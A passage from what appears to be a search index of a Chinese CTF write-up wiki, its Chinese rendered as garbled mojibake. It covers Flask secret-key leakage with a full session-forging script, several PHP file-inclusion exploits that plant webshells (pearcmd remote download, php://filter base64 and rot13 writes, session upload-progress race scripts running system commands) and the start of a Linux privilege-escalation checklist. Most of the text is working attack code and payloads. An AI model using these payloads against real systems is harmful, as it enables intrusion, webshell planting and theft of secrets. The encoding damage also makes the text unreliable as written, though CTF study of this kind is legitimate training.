ˆåˆ†å¸ƒï¼Œç”±äºprocselfmemå†…å®¹è¾ƒå¤šè€Œä¸”å­˜åœ¨ä¸å¯è¯»å†™éƒ¨åˆ†ï¼Œç›´æ¥è¯»å–ä¼šå¯¼è‡´ç¨‹åºå´©æºƒï¼Œæ‰€ä»¥å…ˆè¯»å–procselfmapsè·å–å †æ ˆåˆ†å¸ƒmap_list = requests.get(url + finfo?file=bypass/proc/self/maps)map_list = map_list.text.split(\\ )for i in map_list: map_addr = re.match(r([a-z0-9]+)-([a-z0-9]+) rw, i) if map_addr: start = int(map_addr.group(1), 16) end = int(map_addr.group(2), 16) print(Found rw addr:, start, -, end) è¯»å–å¯¹åº”ä½ç½®å†…å­˜æ•°æ® ç„¶åè¯»å–procselfmemï¼Œè¯»å–å¯¹åº”ä½ç½®çš„å†…å­˜æ•°æ®ï¼Œå†ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æŸ¥æ‰¾å†…å®¹res = requests.get(furl/info?file=bypass/proc/self/memstart=startend=end)if *abcdefgh in res.text: secret_key = re.findall([a-z0-9]32\\*abcdefgh, res.text) if secret_key: print(Secret Key:, secret_key[0]) ä¼ªé€ sessionhttps://github.com/noraj/flask-session-cookie-manager ä¸€é”®è·å–flag# coding=utf-8#----------------------------------####################################Edited by lx56@blog.lxscloud.top####################################----------------------------------import requestsimport reimport ast, sysfrom abc import ABCfrom flask.sessions import SecureCookieSessionInterfaceurl = http://#æ­¤ç¨‹åºåªèƒ½è¿è¡ŒäºPython3ä»¥ä¸Šif sys.version_info[0] 3: # 3.0 raise Exception(Must be using at least Python 3)#----------------session ä¼ªé€ ----------------class MockApp(object): def __init__(self, secret_key): self.secret_key = secret_key class FSCM(ABC): def encode(secret_key, session_cookie_structure): Encode a Flask session cookie try: app = MockApp(secret_key) session_cookie_structure = dict(ast.literal_eval(session_cookie_structure)) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.dumps(session_cookie_structure) except Exception as e: return [Encoding error] .format(e) raise e#-------------------------------------------#ç”±/proc/self/mapsè·å–å¯è¯»å†™çš„å†…å­˜åœ°å€ï¼Œå†æ ¹æ®è¿™äº›åœ°å€è¯»å–/proc/self/memæ¥è·å–secret keys_key = bypass = ../..#è¯·æ±‚fileè·¯ç”±è¿›è¡Œè¯»å–map_list = requests.get(url + finfo?file=bypass/proc/self/maps)map_list = map_list.text.split(\\ )for i in map_list: #åŒ¹é…æŒ‡å®šæ ¼å¼çš„åœ°å€ map_addr = re.match(r([a-z0-9]+)-([a-z0-9]+) rw, i) if map_addr: start = int(map_addr.group(1), 16) end = int(map_addr.group(2), 16) print(Found rw addr:, start, -, end) #è®¾ç½®èµ·å§‹å’Œç»“æŸä½ç½®å¹¶è¯»å–/proc/self/mem res = requests.get(furl/info?file=bypass/proc/self/memstart=startend=end) #å¦‚æœå‘ç°*abcdefghå­˜åœ¨å…¶ä¸­ï¼Œè¯´æ˜æˆåŠŸæ³„éœ²secretkey if *abcdefgh in res.text: #æ­£åˆ™åŒ¹é…ï¼Œæœ¬é¢˜secret keyæ ¼å¼ä¸º32ä¸ªå°å†™å­—æ¯æˆ–æ•°å­—ï¼Œå†åŠ ä¸Š*abcdefgh secret_key = re.findall([a-z0-9]32\\*abcdefgh, res.text) if secret_key: print(Secret Key:, secret_key[0]) s_key = secret_key[0] break#è®¾ç½®sessionä¸­adminçš„å€¼ä¸º1data = admin:1#ä¼ªé€ sessionheaders = Cookie : session= + FSCM.encode(s_key, data)#è¯·æ±‚adminè·¯ç”±try: flag = requests.get(url + admin, headers=headers) print(Flag is, flag.text)except: print(Something error)"},{"title":"include(.php)","path":"/wiki/WP/æ–‡ä»¶åŒ…å«/include(.php).html","content":"include( .php)includeé™åˆ¶æ–‡ä»¶åç¼€if(isset($_GET[c])) $c = $_GET[c]; if(!preg_match(/flag/i, $c)) include($c..php); else highlight_file(__FILE__); $c å¯ä»¥ç”¨ï¼Ÿ æ¥é—­åˆ æ›´æ–°: 2025-09-06 15:37:31åŸæ–‡: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/2b447ea7f0be5c7a52f2792beb3b6e6e"},{"title":"pearæ–‡ä»¶åŒ…å«","path":"/wiki/WP/æ–‡ä»¶åŒ…å«/pearæ–‡ä»¶åŒ…å«.html","content":"pearæ–‡ä»¶åŒ…å«æ¡ä»¶ï¼š æœ‰æ–‡ä»¶åŒ…å«ç‚¹ å¼€å¯äº†pearæ‰©å±• é…ç½®æ–‡ä»¶ä¸­register_argc_argv è®¾ç½®ä¸ºOn,è€Œé»˜è®¤ä¸ºOff ä¾‹é¢˜ ?phperror_reporting(0);$file = $_GET[file];if(isset($file) !preg_match(/input|data|phar|log|filter/i,$file)) include $file;else show_source(__FILE__); if(isset($_GET[info])) phpinfo(); æˆ‘ä»¬åˆ©ç”¨pearæ‰©å±•è¿›è¡Œæ–‡ä»¶åŒ…å« 1ã€è¿œç¨‹æ–‡ä»¶ä¸‹è½½å®ç°è¿œç¨‹æ–‡ä»¶åŒ…å«poc:/?file=/usr/local/lib/php/pearcmd.phpcaigo+install+R+/var/www/html/+http://xxx.xxx.xxx/1.php å®ƒæç¤ºä¸‹è½½åˆ°è¿™ä¸ªç›®å½•â€tmppeardownload1.phpâ€ï¼Œæˆ‘ä»¬å°è¯•åŒ…å«å®ƒ 2ã€ç”Ÿæˆé…ç½®æ–‡ä»¶ï¼Œé…ç½®é¡¹ä¼ å…¥æˆ‘ä»¬æ¶æ„çš„phpä»£ç çš„å½¢å¼pocï¼š/?file=/usr/local/lib/php/pearcmd.php+-c+/tmp/ctf.php+-d+man_dir=?eval($_POST[1]);?+-s+ ç”±äºhackbarä¼šå°è¯•ç¼–ç å†™å…¥çš„æ•°æ®ä¼šå˜æˆè¿™æ ·%3C?eval($_POST[1]);?%3E;ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨burpä¿®æ”¹ä¸€ä¸‹å‘åŒ… æç¤ºå†™å…¥æˆåŠŸï¼Œå°è¯•åŒ…å«tmpctf.php 3ã€å†™é…ç½®æ–‡ä»¶æ–¹å¼poc:/?file=/usr/local/lib/php/pearcmd.phpaaaa+config-create+/var/www/html/?=`$_POST[1]`;?+1.php ç”±äºå¯èƒ½ä¼šé‡åˆ°å‰é¢çš„ç¼–ç é—®é¢˜ï¼Œæˆ‘ä»¬è¿˜æ˜¯ç”¨burp ç„¶åè®¿é—®ç½‘ç«™æ ¹ç›®å½•çš„1.php å› ä¸ºæˆ‘ä»¬å†™çš„pocæ˜¯ç¬¦å·åŒ…èµ·æ¥æ˜¯çš„å‘½ä»¤æ‰§è¡Œï¼Œè¦æ³¨æ„ä¸æ˜¯eval,æˆ‘ä»¬ç›´æ¥ç”¨curlåå¼¹ é™¤äº†pearcmdè¿˜æœ‰peclcmd"},{"title":"include(   .php)","path":"/wiki/WP/æ–‡ä»¶åŒ…å«/include(   .php).html","content":"includeé™åˆ¶æ–‡ä»¶åç¼€if(isset($_GET[c])) $c = $_GET[c]; if(!preg_match(/flag/i, $c)) include($c..php); else highlight_file(__FILE__); $c å¯ä»¥ç”¨ï¼Ÿ æ¥é—­åˆ"},{"title":"php_filter","path":"/wiki/WP/æ–‡ä»¶åŒ…å«/php_filter.html","content":"php:è®¿é—®å„ä¸ªè¾“å…¥è¾“å‡ºæµï¼ˆIO streamsï¼‰ï¼Œåœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯php:filterå’Œphp:input,php:filterç”¨äºè¯»å–æºç ã€‚ åŸºæœ¬php:inputç”¨äºæ‰§è¡Œphpä»£ç  php://filter # è¯»å–æºç  writeçš„è¯GETæäº¤?file=php://filter/wirte=convert.base64-decode/resource=2.phpPOSTæäº¤content=PD9waHAgYXNzZXJ0KCRfUE9TVFt4XSk7Pz4=- wirteï¼šå†™å…¥- convert.base64-decodeï¼šå¯¹å†™è¿›æ–‡ä»¶é‡Œçš„å†…å®¹å…ˆè¿›è¡Œä¸€æ¬¡base64è§£ç ï¼Œå†å†™å…¥- resourceï¼šæŒ‡å®šå†™å…¥çš„æ–‡ä»¶å- contentæäº¤çš„å€¼æ˜¯ç»è¿‡base64ç¼–ç åçš„ä¸€å¥è¯æœ¨é©¬//?php assert($_POST[x]);?æ–‡ä»¶åˆ›å»ºæˆåŠŸåï¼Œç›´æ¥èšå‰‘è¿æ¥å³å¯ string.rot13?php error_reporting(0);highlight_file(__FILE__);//flag in /flag$file = $_GET[file];$content = $_POST[content];file_put_contents($file,?php die();?.$content);? è¿™é“é¢˜å°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„ç»•è¿‡æ­»äº¡ä»£ï¼Œå› ä¸ºåœ¨ä¸­é—´åŠ ä¸Šäº†?php die();?ï¼Œè¿™å°±ä¼šå¯¼è‡´ä¼šç»ˆæ­¢phpçš„æ‰§è¡Œï¼Œä¸ä¼šè¿è¡Œ$contentçš„å€¼è¿™é‡Œæˆ‘ä»¬ç”¨å¦ä¸€ä¸ªè¿‡æ»¤å™¨string.rot13rot13ä¹Ÿå°±æ˜¯å‡¯æ’’13ï¼ŒROT13 ç¼–ç æ˜¯æŠŠæ¯ä¸€ä¸ªå­—æ¯åœ¨å­—æ¯è¡¨ä¸­å‘å‰ç§»åŠ¨ 13 ä¸ªå­—æ¯å¾—åˆ°ã€‚æ•°å­—å’Œéå­—æ¯å­—ç¬¦ä¿æŒä¸å˜ã€‚ç¼–ç å’Œè§£ç éƒ½æ˜¯ç”±ç›¸åŒçš„å‡½æ•°å®Œæˆçš„ã€‚å¦‚æœæ‚¨æŠŠä¸€ä¸ªå·²ç¼–ç çš„å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œé‚£ä¹ˆå°†è¿”å›åŸå§‹å­—ç¬¦ä¸²ã€‚payload:GETæäº¤/?file=php://filter/write=string.rot13/resource=3.phpPOSTæäº¤content=?cuc nffreg($_CBFG[k]);?pocè§£é‡Šstring.rot13æ˜¯å‡¯æ’’13ç¼–ç contentæäº¤çš„å€¼æ˜¯ç»è¿‡rot13ç¼–ç åçš„ä¸€å¥è¯æœ¨é©¬ è¡¥å……ï¼šphp:filterå…è®¸è®¿é—® PHP çš„è¾“å…¥è¾“å‡ºæµã€æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œé”™è¯¯æè¿°ç¬¦ï¼Œ å†…å­˜ä¸­ã€ç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠå¯ä»¥æ“ä½œå…¶ä»–è¯»å–å†™å…¥æ–‡ä»¶èµ„æºçš„è¿‡æ»¤å™¨æ ¼å¼ä¸ºï¼šphp:filter è¿‡æ»¤å™¨(read)| è¿‡æ»¤å™¨(write) resource ç›®æ ‡æ–‡ä»¶å‚æ•°ï¼šresourceè¦è¿‡æ»¤çš„åˆ—è¡¨readè¯»åˆ—è¡¨ï¼Œè®¾ç½®è¿‡æ»¤å™¨writeå†™åˆ—è¡¨ï¼Œè®¾ç½®è¿‡æ»¤å™¨ è¿‡æ»¤å™¨å­—ç¬¦ä¸²è¿‡æ»¤å™¨string.rot13 string.rot13ï¼ˆè‡ª PHP 4.3.0 èµ·ï¼‰ä½¿ç”¨æ­¤è¿‡æ»¤å™¨ç­‰åŒäºç”¨ str_rot13()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚ str_rot13â€”å¯¹å­—ç¬¦ä¸²æ‰§è¡ŒROT13è½¬æ¢. ROT13ç¼–ç ç®€å•åœ°ä½¿ç”¨å­—æ¯è¡¨ä¸­åé¢ç¬¬13ä¸ªå­—æ¯æ›¿æ¢å½“å‰å­—æ¯ï¼ŒåŒæ—¶å¿½ç•¥éå­—æ¯è¡¨ä¸­çš„å­—ç¬¦ã€‚ç¼–ç å’Œè§£ç éƒ½ä½¿ç”¨ç›¸åŒçš„å‡½æ•°ï¼Œä¼ é€’ä¸€ä¸ªç¼–ç è¿‡çš„å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œå°†å¾—åˆ°åŸå§‹å­—ç¬¦ä¸²ã€‚ string.toupper string.tolowerï¼ˆè‡ª PHP 5.0.0 èµ·ï¼‰ä½¿ç”¨æ­¤è¿‡æ»¤å™¨ç­‰åŒäºç”¨ strtolower()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚ strtoupperâ€”å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºå¤§å†™ string.tolower ï¼ˆè‡ª PHP 5.0.0 èµ·ï¼‰ä½¿ç”¨æ­¤è¿‡æ»¤å™¨ç­‰åŒäºç”¨ strtolower()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚ strtolowerâ€”å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºå°å†™ string.strip_tagsä½¿ç”¨æ­¤è¿‡æ»¤å™¨ç­‰åŒäºç”¨ strip_tags()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚å¯ä»¥ç”¨ä¸¤ç§æ ¼å¼æ¥æ”¶å‚æ•°ï¼šä¸€ç§æ˜¯å’Œstrip_tags()å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°ç›¸ä¼¼çš„ä¸€ä¸ªåŒ…å«æœ‰æ ‡è®°åˆ—è¡¨çš„å­—ç¬¦ä¸²ï¼Œä¸€ç§æ˜¯ä¸€ä¸ªåŒ…å«æœ‰æ ‡è®°åçš„æ•°ç»„ã€‚ strip_tagsâ€”ä»å­—ç¬¦ä¸²ä¸­å»é™¤ HTML å’Œ PHP æ ‡è®°.è¯¥å‡½æ•°å°è¯•è¿”å›ç»™å®šçš„å­—ç¬¦ä¸²strå»é™¤ç©ºå­—ç¬¦ã€HTML å’Œ PHP æ ‡è®°åçš„ç»“æœã€‚å®ƒä½¿ç”¨ä¸å‡½æ•°fgetss()ä¸€æ ·çš„æœºåˆ¶å»é™¤æ ‡è®°ã€‚ è½¬æ¢è¿‡æ»¤å™¨å¦‚åŒ string.* è¿‡æ»¤å™¨ï¼Œconvert.* è¿‡æ»¤å™¨çš„ä½œç”¨å°±å’Œå…¶åå­—ä¸€æ ·ã€‚è½¬æ¢è¿‡æ»¤å™¨æ˜¯ PHP 5.0.0 æ·»åŠ çš„ã€‚convert.base64convert.base64-encodeå’Œ convert.base64-decodeä½¿ç”¨è¿™ä¸¤ä¸ªè¿‡æ»¤å™¨ç­‰åŒäºåˆ†åˆ«ç”¨base64_encode()å’Œbase64_decode()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚convert.base64-encodeæ”¯æŒä»¥ä¸€ä¸ªå…³è”æ•°ç»„ç»™å‡ºçš„å‚æ•°ã€‚å¦‚æœç»™å‡ºäº†line-lengthï¼Œbase64 è¾“å‡ºå°†è¢«ç”¨line-lengthä¸ªå­—ç¬¦ä¸º é•¿åº¦è€Œæˆªæˆå—ã€‚å¦‚æœç»™å‡ºäº†line-break-charsï¼Œæ¯å—å°†è¢«ç”¨ç»™å‡ºçš„å­—ç¬¦éš”å¼€ã€‚è¿™äº›å‚æ•°çš„æ•ˆæœå’Œç”¨base64_encode()å†åŠ ä¸Š chunk_split()ç›¸åŒã€‚ convert.quotedconvert.quoted-printable-encodeå’Œconvert.quoted-printable-decodeä½¿ç”¨æ­¤è¿‡æ»¤å™¨çš„decodeç‰ˆæœ¬ç­‰åŒäºç”¨ quoted_printable_decode()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚æ²¡æœ‰å’Œconvert.quoted-printable-encodeç›¸å¯¹åº”çš„å‡½æ•°ã€‚convert.quoted-printable-encodeæ”¯æŒä»¥ä¸€ä¸ªå…³è”æ•°ç»„ç»™å‡ºçš„å‚æ•°ã€‚é™¤äº†æ”¯æŒå’Œconvert.base64-encodeä¸€æ ·çš„é™„åŠ å‚æ•°å¤–ï¼Œconvert.quoted-printable-encodeè¿˜æ”¯æŒå¸ƒå°”å‚æ•°binaryå’Œ force-encode-firstã€‚convert.base64-decodeåªæ”¯æŒline-break-charså‚æ•°ä½œä¸ºä»ç¼–ç è½½è·ä¸­å‰¥ç¦»çš„ç±»å‹æç¤ºã€‚ convert.iconv.*è¿™ä¸ªè¿‡æ»¤å™¨éœ€è¦phpæ”¯æŒ iconv ï¼Œè€Œiconvæ˜¯é»˜è®¤ç¼–è¯‘çš„ã€‚ä½¿ç”¨convert.iconv.*è¿‡æ»¤å™¨ç­‰åŒäºç”¨iconv()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚ iconv â€” å­—ç¬¦ä¸²æŒ‰è¦æ±‚çš„å­—ç¬¦ç¼–ç æ¥è½¬æ¢ convery.iconv.*çš„ä½¿ç”¨æœ‰ä¸¤ç§æ–¹æ³•: convert.iconv..orconvert.iconv.123æ”¯æŒçš„å­—ç¬¦ç¼–ç æœ‰ä¸€ä¸‹å‡ ç§ï¼ˆè¯¦ç»†å‚è€ƒå®˜æ–¹æ‰‹å†Œï¼‰ UCS-4*UCS-4BEUCS-4LE*UCS-2UCS-2BEUCS-2LEUTF-32*UTF-32BE*UTF-32LE*UTF-16*UTF-16BE*UTF-16LE*UTF-7UTF7-IMAPUTF-8*ASCII* å¸¸è§è¿‡æ»¤å™¨ï¼šstring.xxx(å­—ç¬¦è¿‡æ»¤å™¨): string.rot13ã€string.toupperã€string.tolowerã€string.strip_tagsconvert.xxx (è½¬æ¢è¿‡æ»¤å™¨):convert.base64ã€convert.quoted-printableã€convert.iconvç­‰ç­‰compression.xxx(å‹ç¼©è¿‡æ»¤):compression.zlibã€compression.bzip2ã€compression.zlib.deflateã€compression.bzip2.compressç­‰ç­‰mcrypt(åŠ å¯†è¿‡æ»¤)ï¼šPHP 7.1.0èµ·åºŸå¼ƒï¼ #æ‰€ä»¥payloadï¼ˆphpæ–‡ä»¶è¯»å–ä½¿ç”¨ï¼šconvert.xxx (è½¬æ¢è¿‡æ»¤å™¨)ï¼‰ç¬¬ä¸‰æ­¥ï¼špayloadä¸ºï¼š?filenamephp:filterconvert.iconv.base64*.base64resourceindex.php###å‘ç°æ˜¾ç¤ºæœªæ‰¾åˆ°ï¼åº”è¯¥æ˜¯è½¬æ¢è¿‡æ»¤å™¨ä¸­çš„å­—ç¬¦ç¼–ç è¢«ç¦æ­¢äº†ï¼Œå­—ç¬¦ç¼–ç å­—å…¸æ›´æ¢ï¼Œçˆ†ç ´å­—ç¬¦ç¼–ç ã€‚å¸¸è§å­—ç¬¦ç¼–ç ï¼šUCS-4*UCS-4BEUCS-4LE*UCS-4LEUCS-2UCS-2BEUCS-2LEUTF-32*UTF-32BE*UTF-32LE*UTF-16*UTF-16BE*UTF-16LE*UTF-7UTF7-IMAPUTF-8*ASCII*EUC-JP*SJIS*eucJP-win*SJIS-win*"},{"title":"æ–‡ä»¶åŒ…å«","path":"/wiki/WP/æ–‡ä»¶åŒ…å«/index.html","content":"cat_flask+flask_sessionä¼ªé€  ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ include( .php) ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ include(.php) ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ pearæ–‡ä»¶åŒ…å« ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ php_filter ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ åè®®&&ä¼ªåè®® ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ æœ‰æ„æ€çš„ç‚¹ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£"},{"title":"é‚å›¦æ¬¢é–å‘­æƒˆ","path":"/wiki/WP/é‚å›¦æ¬¢é–å‘­æƒˆ/index.html","content":"session ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£"},{"title":"æœ‰æ„æ€çš„ç‚¹","path":"/wiki/WP/æ–‡ä»¶åŒ…å«/æœ‰æ„æ€çš„ç‚¹.html","content":"å…ˆçœ‹ä»£ç ?phpshow_source(__FILE__);echo $_GET[hello];$page=$_GET[page];while (strstr($page, php://)) $page=str_replace(php://, , $page);include($page);? åªè¿‡æ»¤äº†php: æ²¡æœ‰è€ƒè™‘å¤§å°å†™ï¼Œä¹Ÿæ²¡æœ‰è€ƒè™‘data:æŒ‰éƒ¨å°±ç­çš„å¯ä»¥åšå‡ºæ¥ä½†æœ‰ä¸€ç‚¹ï¼Œä»£ç ä¸­çš„$_GET[â€˜helloâ€™];å¥½åƒæ²¡å•¥ç”¨ï¼Œçœ‹å®˜æ–¹WP åŸæ¥å¯ä»¥è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œæ„é€ å…¥ä¸‹http://192.168.100.161:50281/?page=http://127.0.0.1/index.php/?hello=%3C?system(%22ls%22);?%3E"},{"title":"session","path":"/wiki/WP/é‚å›¦æ¬¢é–å‘­æƒˆ/session.html","content":"é¢˜ç›®if(isset($_GET[file])) $file = $_GET[file]; $file = str_replace(php, ???, $file); $file = str_replace(data, ???, $file); $file = str_replace(:, ???, $file); $file = str_replace(., ???, $file); include($file);else highlight_file(__FILE__); ç›¸å…³çŸ¥è¯†åœ¨php5.4ä¹‹åphp.iniå¼€å§‹æœ‰â¼ä¸ªé»˜è®¤é€‰é¡¹ 1.session.upload_progress.enabled = on 2.session.upload_progress.cleanup = on 3.session.upload_progress.prefix = â€œupload_progress_â€ 4.session.upload_progress.name = â€œPHP_SESSION_UPLOAD_PROGRESSâ€ 5.session.use_strict_mode=off ç¬¬â¼€ä¸ªè¡¨ç¤ºå½“æµè§ˆå™¨å‘æœåŠ¡å™¨ä¸Šä¼ â¼€ä¸ªâ½‚ä»¶æ—¶ï¼Œphpå°†ä¼šæŠŠæ­¤æ¬¡â½‚ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯(å¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰)å­˜å‚¨åœ¨sessionå½“ä¸­ ç¬¬â¼†ä¸ªè¡¨ç¤ºå½“â½‚ä»¶ä¸Šä¼ ç»“æŸåï¼Œphpå°†ä¼šâ½´å³æ¸…ç©ºå¯¹åº”sessionâ½‚ä»¶ä¸­çš„å†…å®¹ ç¬¬ä¸‰å’Œç¬¬å››ä¸ªprefix+nameå°†è¡¨ç¤ºä¸ºsessionä¸­çš„é”®å ç¬¬äº”ä¸ªè¡¨ç¤ºæˆ‘ä»¬å¯¹Cookieä¸­sessionIDå¯æ§ç®€â½½â¾”ä¹‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©â½¤session.upload_progresså°†â½Šâ»¢å†™â¼Šsessionâ½‚ä»¶ï¼Œç„¶ååŒ…å«è¿™ä¸ªsessionâ½‚ä»¶ã€‚ä¸è¿‡å‰ææ˜¯æˆ‘ä»¬éœ€è¦åˆ›å»ºâ¼€ä¸ªsessionâ½‚ä»¶ï¼Œå¹¶ä¸”çŸ¥é“sessionâ½‚ä»¶çš„å­˜æ”¾ä½ç½®ã€‚å› ä¸ºsession.use_strict_mode=offçš„å…³ç³»ï¼Œæˆ‘ä»¬å¯ä»¥â¾ƒå®šä¹‰sessionIDlinuxç³»ç»Ÿä¸­sessionâ½‚ä»¶â¼€èˆ¬çš„é»˜è®¤å­˜å‚¨ä½ç½®ä¸º /tmp æˆ– /var/lib/php/sessionä¾‹å¦‚æˆ‘ä»¬åœ¨Cookieä¸­è®¾ç½®äº†PHPSESSID=flagï¼Œphpä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºâ½‚ä»¶ï¼š/tmp/sess_flagï¼Œå³ä½¿æ­¤æ—¶â½¤æˆ·æ²¡æœ‰åˆå§‹åŒ–sessionï¼Œphpä¹Ÿä¼šâ¾ƒåŠ¨åˆå§‹åŒ–Sessionã€‚ å¹¶äº§â½£â¼€ä¸ªé”®å€¼ï¼Œä¸ºprefix+nameçš„å€¼ï¼Œæœ€åè¢«å†™â¼Šsess_â½‚ä»¶â¾¥è¿˜æœ‰â¼€ä¸ªå…³é”®ç‚¹å°±æ˜¯session.upload_progress.cleanupé»˜è®¤æ˜¯å¼€å¯çš„ï¼Œåªè¦è¯»å–äº†postæ•°æ®ï¼Œå°±ä¼šæ¸…é™¤è¿›åº¦ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ©â½¤æ¡ä»¶ç«äº‰æ¥passï¼Œå†™â¼€ä¸ªè„šæœ¬æ¥å®Œæˆ import ioimport requestsimport threadingurl = http://a914fd90-ab5f-44ae-a9a7-20fb9b6d991e.challenge.ctf.show/def write(session): data = PHP_SESSION_UPLOAD_PROGRESS: ?php system(tac f*);?mumuzi while True: f = io.BytesIO(ba * 1024 * 10) response = session.post(url,cookies=PHPSESSID: flag, data=data, files=file: (muzi.txt, f))def read(session): while True: response = session.get(url+?file=/tmp/sess_flag) if mumuzi in response.text: print(response.text) break else: print(retry)if __name__ == __main__: session = requests.session() write = threading.Thread(target=write, args=(session,)) write.daemon = True write.start() read(session)"},{"title":"Lin_ä¿¡æ¯æ”¶é›†","path":"/wiki/å†…ç½‘/ææƒ/Lin_ä¿¡æ¯æ”¶é›†.html","content":"é¡¹ç›®ï¼ˆItemï¼‰ å‘½ä»¤æ£€æŸ¥é¡¹ï¼ˆCommandCheckï¼‰ ç›®çš„ï¼ˆPurposeï¼‰ æ³¨æ„äº‹é¡¹ï¼ˆNotesï¼‰ é£é™©ç­‰çº§ï¼ˆLowHighï¼‰ è¡ŒåŠ¨å»ºè®®ï¼ˆæ¦‚å¿µçº§ï¼‰ ç³»ç»Ÿä¸å†…æ ¸ï¼ˆSystem Kernelï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);uname -a/font ç¡®å®š OS å‘è¡Œç‰ˆã€è¿è¡Œå†…æ ¸ç‰ˆæœ¬ vs å·²å®‰è£…å†…æ ¸ç‰ˆæœ¬ï¼ˆæ£€æµ‹å†…æ ¸æ¼æ´å¯èƒ½æ€§ï¼‰ å…³æ³¨å†…æ ¸ç‰ˆæœ¬æ˜¯å¦å­˜åœ¨å·²çŸ¥ææƒæ¼æ´ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);CVE-2021-4034/font å¯¹åº”å†…æ ¸ç‰ˆæœ¬èŒƒå›´ï¼‰ High å¯¹æ¯” font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);exploit-db/font æ’æŸ¥æ˜¯å¦å­˜åœ¨åŒ¹é…å†…æ ¸æ¼æ´ï¼›ä¼˜å…ˆæ›´æ–°å†…æ ¸ å½“å‰èº«ä»½ä¸ç™»å½•ï¼ˆCurrent Identity Loginsï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);id/fontï¼›font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);last/font å®šä½ç”¨æˆ·è´¦æˆ·ã€æœ€è¿‘ç™»å½•è®°å½•ï¼Œè¯†åˆ«æ½œåœ¨é—²ç½®è´¦æˆ·æˆ–ç‰¹æƒè´¦æˆ·ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);uid=0/font çš„ rootï¼‰ æ£€æŸ¥æ˜¯å¦å­˜åœ¨ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sudo/font æƒé™ç”¨æˆ·æˆ– font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);wheel/font ç»„æˆå‘˜ High å®¡è®¡éæ´»è·ƒè´¦æˆ·ï¼Œé™åˆ¶ç‰¹æƒç”¨æˆ·ç™»å½•æ¥æº SUIDSGID æ–‡ä»¶ï¼ˆSUIDSGID Filesï¼‰ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);find / -perm -4000 2/dev/null/fontï¼›font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);find / -perm -2000 2/dev/null/font æŸ¥æ‰¾å…·æœ‰ SUIDSGID æƒé™çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆå¯èƒ½è¢«æ»¥ç”¨ææƒï¼‰ ç»“åˆ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);GTFOBins/font æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨å·²çŸ¥æ»¥ç”¨æ–¹æ³•ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);find/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);nmap/font ç­‰ï¼‰ High ç§»é™¤ä¸å¿…è¦çš„ SUIDSGID æƒé™ï¼Œä½¿ç”¨ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);chmod u-s/font Capabilities æƒé™ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);getcap -r / 2/dev/null/font æŸ¥æ‰¾å…·æœ‰ POSIX Capabilities çš„æ–‡ä»¶ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);CAP_SYS_ADMIN/font 